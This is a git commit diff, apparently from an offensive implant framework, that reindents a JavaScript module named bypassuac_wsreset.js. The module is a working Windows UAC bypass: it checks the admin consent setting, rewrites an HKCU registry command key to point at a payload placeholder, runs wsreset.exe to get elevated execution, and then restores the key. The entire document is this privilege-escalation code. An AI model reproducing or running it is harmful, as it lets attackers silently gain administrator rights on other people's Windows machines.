5797558adbb9ce7c98210581555e7bd52a36020e
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2020-03-05 01:37:29 +0300

    Update bypassuac_wsreset.js

--- data/implant/elevate/bypassuac_wsreset.js
+++ data/implant/elevate/bypassuac_wsreset.js
@@ -17,30 +17,30 @@
 //        along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 try
- {
-     var consentpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
-     var consentval = proton.registry.read(proton.registry.HKLM, consentpath, "ConsentPromptBehaviorAdmin", proton.registry.DWORD).uValue;
-     if (consentval == 2)
-     {
-         var e = Error('Consent value is too high!');
-         throw e;
-     }
+{
+    var consentpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+    var consentval = proton.registry.read(proton.registry.HKLM, consentpath, "ConsentPromptBehaviorAdmin", proton.registry.DWORD).uValue;
+    if (consentval == 2)
+    {
+        var e = Error('Consent value is too high!');
+        throw e;
+    }
 
-     var path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command";
-     var delegate = proton.registry.read(proton.registry.HKCU, path, 'DelegateExecute', proton.registry.STRING).SValue;
-     proton.registry.write(proton.registry.HKCU, path, 'DelegateExecute', '', proton.registry.STRING);
-     proton.registry.write(proton.registry.HKCU, path, '', '~PAYLOAD_DATA~', proton.registry.STRING);
+    var path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command";
+    var delegate = proton.registry.read(proton.registry.HKCU, path, 'DelegateExecute', proton.registry.STRING).SValue;
+    proton.registry.write(proton.registry.HKCU, path, 'DelegateExecute', '', proton.registry.STRING);
+    proton.registry.write(proton.registry.HKCU, path, '', '~PAYLOAD_DATA~', proton.registry.STRING);
 
-     proton.shell.run("C:\\Windows\\System32\\wsreset.exe", false);
+    proton.shell.run("C:\\Windows\\System32\\wsreset.exe", false);
 
-     proton.work.report("Completed");
+    proton.work.report("Completed");
 
-     proton.registry.write(proton.registry.HKCU, path, 'DelegateExecute', delegate, proton.registry.STRING);
-     proton.registry.write(proton.registry.HKCU, path, '', '', proton.registry.STRING);
- }
- catch (e)
- {
-     proton.work.error(e);
- }
+    proton.registry.write(proton.registry.HKCU, path, 'DelegateExecute', delegate, proton.registry.STRING);
+    proton.registry.write(proton.registry.HKCU, path, '', '', proton.registry.STRING);
+}
+catch (e)
+{
+    proton.work.error(e);
+}
 
- proton.exit();
+proton.exit();
